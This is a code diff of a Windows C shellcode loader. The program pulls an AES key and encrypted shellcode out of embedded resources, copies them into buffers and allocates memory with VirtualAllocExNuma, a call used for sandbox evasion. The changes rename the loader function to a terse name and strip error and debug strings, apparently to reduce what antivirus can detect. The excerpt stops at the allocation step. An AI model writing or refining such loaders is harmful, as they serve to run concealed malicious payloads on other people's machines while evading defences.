@@ -5,13 +5,10 @@
 #pragma comment (lib, "user32.lib")
 
 // Function to load resource data into memory
-void ResourceLoadBaby(const char* resName, unsigned char** data, DWORD* size) {
+void ldres(const char* resName, unsigned char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
     HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
-    if (!hResource) {
-        printf("Resource %s not found!\n", resName);
-        exit(1);
-    }
+    
 
     HGLOBAL hResData = LoadResource(hModule, hResource);
     *size = SizeofResource(hModule, hResource);
@@ -50,25 +47,21 @@ int main() {
 
     unsigned char* AESkey;
     DWORD AESkeyLen;
-    ResourceLoadBaby("AESKEY", &AESkey, &AESkeyLen);  // Load AES key
+    ldres("AESKEY", &AESkey, &AESkeyLen);  // Load AES key
 
     unsigned char* AESCode;
     DWORD AESCodeLen;
-    ResourceLoadBaby("AESCODE", &AESCode, &AESCodeLen);  // Load AES shellcode
+    ldres("AESCODE", &AESCode, &AESCodeLen);  // Load AES shellcode
 
     // Print the AES key and shellcode for debugging (as hex)
      unsigned char keyy[AESkeyLen];
     unsigned char codee[AESCodeLen];
 
-    // Copy the data into the arrays
+   
     memcpy(keyy, AESkey, AESkeyLen);
     memcpy(codee, AESCode, AESCodeLen);
 
-    // Print the AES key and shellcode for debugging (as hex)
-    //printf("AES Key: ");
-    //PrintHex(keyy, AESkeyLen);
-    //printf("AES Code: ");
-    //PrintHex(codee, AESCodeLen);
+   
 
     LPVOID memalo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
 
